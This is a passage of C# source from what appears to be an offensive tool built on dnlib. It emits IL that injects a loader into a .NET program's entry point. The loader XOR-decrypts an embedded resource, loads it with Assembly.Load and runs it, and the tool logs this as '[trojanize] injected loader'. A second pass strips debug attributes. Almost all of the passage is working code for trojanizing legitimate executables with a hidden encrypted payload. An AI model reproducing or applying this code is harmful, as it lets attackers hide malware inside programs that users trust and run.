        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Byte.TypeDefOrRef));
        I.Add(OpCodes.Stloc_3.ToInstruction());

        // XOR loop
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));
        var loopCheck = OpCodes.Nop.ToInstruction();
        I.Add(OpCodes.Br.ToInstruction(loopCheck));

        var loopBody = OpCodes.Ldloc_3.ToInstruction(); // plain
        I.Add(loopBody);
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldloc_1.ToInstruction()); // enc
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldelem_U1.ToInstruction());
        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
        I.Add(OpCodes.Rem.ToInstruction());
        I.Add(OpCodes.Ldelem_U1.ToInstruction());
        I.Add(OpCodes.Xor.ToInstruction());
        I.Add(OpCodes.Conv_U1.ToInstruction());
        I.Add(OpCodes.Stelem_I1.ToInstruction());
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
        I.Add(OpCodes.Add.ToInstruction());
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));

        I.Add(loopCheck);
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
        I.Add(OpCodes.Ldloc_1.ToInstruction());
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
        I.Add(OpCodes.Blt.ToInstruction(loopBody));

        // var loaded = Assembly.Load(plain); var ep = loaded.EntryPoint;
        I.Add(OpCodes.Ldloc_3.ToInstruction());
        I.Add(OpCodes.Call.ToInstruction(asmLoad));
        I.Add(OpCodes.Callvirt.ToInstruction(getEntryPt));
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[4]));

        // Build invokeArgs: check if ep has parameters
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
        I.Add(OpCodes.Callvirt.ToInstruction(getParams));
        I.Add(OpCodes.Ldlen.ToInstruction());

        var hasArgs = OpCodes.Nop.ToInstruction();
        I.Add(OpCodes.Brtrue.ToInstruction(hasArgs));

        // No params path: empty object[]
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
        var storeArgs = OpCodes.Stloc.ToInstruction(body.Variables[5]);
        I.Add(OpCodes.Br.ToInstruction(storeArgs));

        // Has params path: new object[] { args }
        I.Add(hasArgs);
        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
        I.Add(OpCodes.Dup.ToInstruction());
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        // Load the original args parameter
        if (entryPoint.Parameters.Count > 0)
            I.Add(new Instruction(OpCodes.Ldarg, entryPoint.Parameters[0]));
        else
        {
            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
            I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.String.TypeDefOrRef));
        }
        I.Add(OpCodes.Stelem_Ref.ToInstruction());

        I.Add(storeArgs);

        // ep.Invoke(null, invokeArgs)
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
        I.Add(OpCodes.Ldnull.ToInstruction());
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
        I.Add(OpCodes.Callvirt.ToInstruction(invoke));
        I.Add(OpCodes.Pop.ToInstruction());
        I.Add(OpCodes.Ret.ToInstruction());

        body.SimplifyBranches();
        body.OptimizeBranches();
        body.OptimizeMacros();

        Console.Error.WriteLine($"  [trojanize] injected loader into {entryType.Name}.{entryPoint.Name}");
        Console.Error.WriteLine($"  [trojanize] resources: {resourceName}, {keyResourceName}");
    }

    // ── Strip-debug pass ─────────────────────────────────────────────────

    private static void ApplyStripDebug(ModuleDef module)
    {
        // Remove assembly-level debug attributes
        var assembly = module.Assembly;
        if (assembly != null)
        {
            var toRemove = assembly.CustomAttributes
                .Where(a =>
                {
                    var name = a.TypeFullName;
                    return name == "System.Diagnostics.DebuggableAttribute"
                        || name == "System.Runtime.CompilerServices.CompilationRelaxationsAttribute"
                        || name == "System.Runtime.CompilerServices.RuntimeCompatibilityAttribute";
                })
                .ToList();

            foreach (var attr in toRemove)
                assembly.CustomAttributes.Remove(attr);
        }

        // Remove module-level debug custom attributes
        var moduleToRemove = module.CustomAttributes
            .Where(a => a.TypeFullName == "System.Diagnostics.DebuggableAttribute")
            .ToList();
        foreach (var attr in moduleToRemove)
            module.CustomAttributes.Remove(attr);
    }
}
